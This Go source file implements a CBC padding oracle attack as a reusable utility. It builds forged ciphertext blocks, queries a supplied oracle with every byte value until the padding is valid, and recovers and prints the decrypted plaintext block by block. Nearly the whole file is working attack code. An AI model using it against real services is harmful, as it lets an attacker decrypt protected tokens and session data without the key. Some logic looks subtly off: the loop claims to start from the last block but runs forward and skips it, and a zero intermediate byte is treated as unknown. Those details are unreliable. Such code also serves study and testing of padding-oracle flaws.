package utils

import (
	"fmt"
	"log"
	"os"
	"strings"
)

type callOracle func(u, token string) (bool, error)
type encodeToken func(buffer []byte) string

// create string C'||Cn to send to oracle with every possible value of C'[k] until find value that has valid padding
func PaddingOracle(chunks [][]byte, urlBase string, callOracle callOracle, encode encodeToken) []byte {
	plaintext := make([]byte, 0)
	// Loop through every chunk beginning with the last
	for i := 1; i < len(chunks)-1; i++ {
		fmt.Printf("\n\n** Starting Chunk %d of %d **\n\n", i, len(chunks)-1)
		plainBlock := make([]byte, 0)
		curr, prev := setAttackBlock(chunks, i)
		interm := make([]byte, len(curr))
		// begin with padding byte 01
		padByte := byte(1)
		// loop through every position of chunk, beginning with last
		for chunkPos := len(curr) - 1; chunkPos >= 0; chunkPos-- {
			// fmt.Printf("[*] Padding byte %d for chunk[%d]\n", padByte, chunkPos)
			// try every possible byte value to check valid padding
			for chr := 0; chr < 256; chr++ {
				token := makeToken(curr, interm, chunkPos, byte(chr), padByte, encode)
				// TODO speed up with concurrency
				isValid, err := callOracle(urlBase, token)
				fatal(err)
				if isValid {
					fmt.Printf("[+] Success: (%v/256) [Byte %d]\n", byte(chr), chunkPos)
					// fmt.Println(token)
					// Solve I2 = C1' ^ P2' and P2 = C1 ^ I2
					var plainByte byte
					interm[chunkPos], plainByte = solveByte(prev[chunkPos], byte(chr), padByte)
					// unshift / prepend to plainBlock bytes slice
					plainBlock = append([]byte{plainByte}, plainBlock...)
					break
				}
				if chr == 255 {
					log.Fatalln("Exhausted attack chars without finding valid padding")
					os.Exit(1)
				}
			}
			// Move on to next padding byte 02, 03, 04... until end of blocksize
			padByte++
		}
		fmt.Printf("\n\nChunk %d Results:\n", i)
		fmt.Printf("[+] Ciphertext [HEX]: %x\n", prev)
		fmt.Printf("[+] Intermediate Bytes [HEX]: %x\n", interm)
		fmt.Printf("[+] Plaintext: %s\n", plainBlock)
		plaintext = append(plaintext, plainBlock...)
	}
	fmt.Println("\n** Finished **\n\n")
	fmt.Printf("[+] Decrypted value (ASCII): %s", string(plaintext))
	return plaintext
}

func solveByte(ciphertext, chr, padByte byte) (byte, byte) {
	interm := chr ^ padByte
	plaintext := interm ^ ciphertext
	return interm, plaintext
}

func setAttackBlock(chunks [][]byte, i int) ([]byte, []byte) {
	curr := chunks[i]
	prev := chunks[i-1]
	// fmt.Println("[*] Current Attack Block:")
	// fmt.Printf("C: %v\n", curr)
	return curr, prev
}

func subAttackBytes(interm, chr, padByte byte) byte {
	// if intermediate value exists, fill that in
	var tmp byte
	if interm != 0 {
		// force intermediate value to desired current padByte
		tmp = interm ^ padByte
	} else {
		tmp = chr
	}
	return tmp
}

func makeToken(curr, interm []byte, chunkPos int, chr, padByte byte, encode encodeToken) string {
	// create C1' block of random characters
	tmp := []byte(strings.Repeat("a", len(curr)))
	for attackPos := len(curr) - 1; attackPos >= chunkPos; attackPos-- {
		tmp[attackPos] = subAttackBytes(interm[attackPos], chr, padByte)
	}
	// fmt.Printf("[-] Attempt attack with: %v\n", tmp)
	test := append(tmp, curr...)
	// fmt.Printf("Test: %v\n", test)
	token := encode(test)
	return token
}
